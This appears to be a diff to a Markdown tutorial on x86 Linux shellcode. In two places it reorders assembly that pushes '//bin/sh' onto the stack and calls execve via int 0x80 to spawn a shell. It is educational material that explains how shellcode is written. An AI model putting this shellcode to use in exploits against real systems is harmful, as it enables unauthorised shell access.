@@ -468,9 +468,9 @@ Finally, the execve syscall and the program interrupt are called to execute the 
         push 0x69622f2f ; push the beginning of "//bin/sh", 'ib//'
         mov byte [esp + 11], al
         mov ebx, esp    ; move pointer to '//bin/sh' into ebx, null terminated
-        mov al, 0xb     ; move syscall code for execve into al
-        xor ecx, ecx    ; clear ecx register
+	xor ecx, ecx    ; clear ecx register
         xor edx, edx    ; clear edx register
+        mov al, 0xb     ; move syscall code for execve into al
         int 0x80        ; call the interrupt to execute execve syscall, execute '//bin/sh' shell
 ```
 
@@ -541,9 +541,9 @@ section .text
         push 0x69622f2f ; push the beginning of "//bin/sh", 'ib//'
         mov byte [esp + 11], al
         mov ebx, esp    ; move pointer to '//bin/sh' into ebx, null terminated
-        mov al, 0xb     ; move syscall code for execve into al
-        xor ecx, ecx    ; clear ecx register
+	xor ecx, ecx    ; clear ecx register
         xor edx, edx    ; clear edx register
+        mov al, 0xb     ; move syscall code for execve into al
         int 0x80        ; call the interrupt to execute execve syscall, execute '//bin/sh' shell
 ````
 
